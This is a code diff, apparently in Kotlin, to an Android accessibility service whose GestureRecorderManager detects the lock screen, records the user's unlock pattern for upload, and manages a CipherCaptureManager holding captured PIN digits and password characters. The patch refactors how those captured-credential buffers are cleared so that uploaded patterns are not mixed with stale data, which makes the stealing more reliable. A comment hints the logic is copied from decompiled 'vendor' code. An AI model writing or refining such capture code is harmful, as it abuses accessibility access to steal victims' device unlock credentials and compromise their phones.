@@ -119,7 +119,9 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
                 recordingStartTime = System.currentTimeMillis()
                 patternPoints.clear()
                 patternCoords = JSONArray()
-                Log.d(TAG, "Lock screen detected -> start pattern recording")
+                // 锁屏时立即清空所有 CipherCaptureManager 缓冲，防止设置流程中的旧数据泄漏
+                clearAllCipherBuffers()
+                Log.d(TAG, "Lock screen detected -> start pattern recording, buffers cleared")
                 handler.postDelayed({ tryEnableTouchExploration() }, 500L)
             }
 
@@ -151,6 +153,7 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
 
         if (pointCount < 4) {
             Log.d(TAG, "Pattern points < 4, skip upload")
+            clearAllCipherBuffers()
             patternPoints.clear()
             patternCoords = JSONArray()
             isRecording = false
@@ -192,6 +195,21 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
     }
 
     /**
+     * Clear ALL CipherCaptureManager buffers to prevent stale data from leaking
+     * into pattern upload. Called on justLocked and when pattern < 4 points.
+     */
+    private fun clearAllCipherBuffers() {
+        service.cipherCaptureManager?.let { ccm ->
+            ccm.pinDigits.clear()
+            ccm.passwordChars.clear()
+            ccm.passwordSnapshots.clear()
+            ccm.hasAlpha = false
+            ccm.pendingCipher = null
+            ccm.collectedEvents.clear()
+        }
+    }
+
+    /**
      * Detect lockPatternView in accessibility tree and enable touch exploration.
      * Vendor: C02969 coroutine + b30 case 1
      */
@@ -209,17 +227,7 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
 
             if (!nodes.isNullOrEmpty() && nodes[0].isVisibleToUser) {
                 enableTouchExploration()
-                // Bug 4 fix: clear ALL cipher buffers (not just pinDigits/pendingCipher)
-                // to prevent stale data from a previous text/PIN password session
-                service.cipherCaptureManager?.let { ccm ->
-                    ccm.pinDigits.clear()
-                    ccm.passwordChars.clear()
-                    ccm.passwordSnapshots.clear()
-                    ccm.hasAlpha = false
-                    ccm.pendingCipher = null
-                    ccm.collectedEvents.clear()
-                }
-                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索，已清空全部密码缓冲")
+                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索")
             }
         } catch (e: Exception) {
             Log.w(TAG, "tryEnableTouchExploration error", e)
